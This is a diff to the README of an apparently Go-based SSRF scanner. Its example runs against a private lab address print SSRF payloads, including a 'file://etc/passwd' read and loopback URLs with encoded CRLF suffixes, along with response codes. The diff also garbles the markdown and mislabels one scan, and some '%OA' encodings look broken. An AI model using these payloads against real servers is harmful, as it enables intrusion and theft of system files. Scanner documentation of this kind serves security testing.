@@ -38,9 +38,9 @@ Flags:
 
 ```
 * Scanning http and scheme payloads w/ crlf:
+
 ```go
 echo "http://192.168.1.10/test.php?u=" | go run main.go scan
-```
  
 [!] Scheme payload match:
 * http://192.168.1.10/test.php?u=file://etc/passwd 200
@@ -59,10 +59,11 @@ echo "http://192.168.1.10/test.php?u=" | go run main.go scan
 * http://192.168.1.10/test.php?u=http://127.127.127.127:8080%23%OA 500
 * http://192.168.1.10/test.php?u=http://127.127.127.127:8080%23%OA 500
 ```
-* Scanning only http payloads w/ crlf:
+
 ```go
+* Scanning only http payloads w/ crlf:
+
 echo "http://192.168.1.10/test.php?u=" | go run main.go scan --skip-scheme
-```
 
 [!] Interesting payloads found
 * http://192.168.1.10/test.php?u=http://127.127.127.127:80%23%OA 200
@@ -78,12 +79,11 @@ echo "http://192.168.1.10/test.php?u=" | go run main.go scan --skip-scheme
 * http://192.168.1.10/test.php?u=http://127.127.127.127:445%23%OA 500
 * http://192.168.1.10/test.php?u=http://127.127.127.127:445%23%OA 500
 ```
-* Scanning only http payloads w/o crlf:
+
 ```go
 * Scanning only http payloads w/ crlf:
-```go
+
 echo "http://192.168.1.10/test.php?u=" | go run main.go scan --skip-scheme --skip-crlf
-```
 
 [!] Interesting payloads found
 * http://192.168.1.10/test.php?u=http://127.1.0.0:80 200
@@ -101,3 +101,4 @@ Please make sure to update tests as appropriate.
 
 ## License
 [MIT](https://choosealicense.com/licenses/mit/)
+
